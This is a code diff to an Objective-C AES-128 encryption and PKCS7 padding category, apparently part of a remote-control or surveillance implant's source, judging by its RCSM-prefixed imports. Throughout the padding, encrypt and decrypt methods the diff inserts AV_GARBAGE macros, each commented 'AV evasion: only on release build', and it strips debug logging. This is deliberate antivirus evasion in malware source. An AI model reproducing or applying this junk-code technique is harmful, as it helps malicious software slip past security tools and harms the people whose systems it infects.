@@ -14,6 +14,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @implementation NSMutableData (AES128)
 
@@ -43,19 +44,43 @@
 }
 
 -(void)doPKCS7Padding:(uint)pad
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (pad > 0)
-  {
+  {   
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
     [self increaseLengthBy: pad];
     
-    char *buff  = (char*)[self bytes];
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
+    char *buff  = (char*)[self bytes];   
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
     char *ptr   = buff + [self length] - pad;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
     
     // do ourself pkcs5/7 padding
     for (int i=0; i < pad; i++) 
-    {
-      *ptr = pad;
-      ptr++;
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
+      *ptr = pad;   
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
+      ptr++;   
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
     }
   }
 }
@@ -67,22 +92,40 @@
   int outLen = 0;
   BOOL needsPadding = YES;
   
-#ifdef DEBUG_MUTABLE_AES
-  infoLog(@"self length: %d", [self length]);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([self length] % kCCBlockSizeAES128)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       pad = ([self length] + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - [self length];
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [self increaseLengthBy: pad];
       
-      outLen        = [self length];
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
+      outLen        = [self length];   
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       needsPadding  = YES;
     }
   else
     {
-      pad           = 0;
-      outLen        = [self length];
+      pad           = 0;   
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
+      outLen        = [self length];   
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       needsPadding  = NO;
     }
   
@@ -97,8 +140,14 @@
   size_t numBytesEncrypted = 0;
   CCCryptorStatus result;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (needsPadding == YES)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       result = CCCrypt(kCCEncrypt, 
                        kCCAlgorithmAES128, 
                        kCCOptionPKCS7Padding,
@@ -110,7 +159,10 @@
                        &numBytesEncrypted);
     }
   else
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       result = CCCrypt(kCCEncrypt, 
                        kCCAlgorithmAES128, 
                        0,
@@ -122,6 +174,9 @@
                        &numBytesEncrypted);
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return result;
 }
 
@@ -130,10 +185,19 @@
   int pad = kCCBlockSizeAES128;
   size_t numBytesEncrypted = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if ([self length] % kCCBlockSizeAES128)
     pad = kCCBlockSizeAES128 - [self length] & (kCCBlockSizeAES128 - 1);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [self doPKCS7Padding: pad];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // padding ourself
   CCCryptorStatus result = 
@@ -147,15 +211,17 @@
                           [self mutableBytes], [self length],    // output
                           &numBytesEncrypted);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   return result;
 }
 
 
 - (CCCryptorStatus)decryptWithKey: (NSData *)aKey
-{
-#ifdef DEBUG_MUTABLE_AES
-  NSLog(@"self length: %d", [self length]);
-#endif
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   //
   // decrypts in-place since this is a mutable data object
@@ -170,6 +236,9 @@
                                    [self mutableBytes], [self length],  // input
                                    [self mutableBytes], [self length],  // output
                                    &numBytesDecrypted);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   return result;
 }
